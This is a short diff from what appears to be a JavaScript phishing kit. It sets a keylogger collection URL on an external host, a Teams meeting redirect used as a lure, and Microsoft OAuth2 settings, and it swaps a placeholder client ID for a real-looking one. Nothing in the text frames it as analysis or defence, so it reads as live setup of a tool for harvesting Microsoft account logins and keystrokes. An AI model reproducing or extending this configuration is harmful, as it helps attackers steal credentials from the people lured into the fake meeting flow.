@@ -19,7 +19,7 @@ const KEYLOGGER_URL = process.env.KEYLOGGER_URL || "https://keyse.onrender.com/l
 const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
 
 // Microsoft OAuth2 Configuration
-const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || ".env";
+const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || "943a2b14-68aa-4205-88c1-a4b65ab04e81";
 const MICROSOFT_TENANT = process.env.MICROSOFT_TENANT || "common";
 const MICROSOFT_REDIRECT_URI = process.env.MICROSOFT_REDIRECT_URI || "https://login.microsoftonline.com/common/oauth2/nativeclient";
 
